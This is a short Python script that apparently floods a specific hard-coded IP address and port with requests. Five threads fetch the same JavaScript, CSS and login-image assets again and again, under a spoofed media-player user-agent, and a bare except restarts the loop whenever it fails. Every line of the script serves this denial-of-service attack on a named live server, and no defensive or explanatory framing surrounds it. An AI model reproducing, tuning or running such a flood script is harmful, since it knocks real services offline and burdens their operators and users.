import threading
import requests
def run():
    try:
        while True:

            url = '''http://8.217.13.38:666/assets/index-FKCxSIKp.js'''
            headers = {"user-agent": "NSPlayer/12.00.22621.2428 WMFSDK/12.00.22621.2428", }
            response = requests.get(url=url, headers=headers, timeout=5)
            url = '''http://8.217.13.38:666/assets/index-wwqThcL1.css'''
            headers = {"user-agent": "NSPlayer/12.00.22621.2428 WMFSDK/12.00.22621.2428", }
            response = requests.get(url=url, headers=headers, timeout=5)
            url = '''http://8.217.13.38:666/assets/loginbg-QlDFZ_h1.png'''
            headers = {"user-agent": "NSPlayer/12.00.22621.2428 WMFSDK/12.00.22621.2428", }
            response = requests.get(url=url, headers=headers, timeout=5)
            print("循环")
    except:
        run()


for i in range(5): threading.Thread(target=run).start()
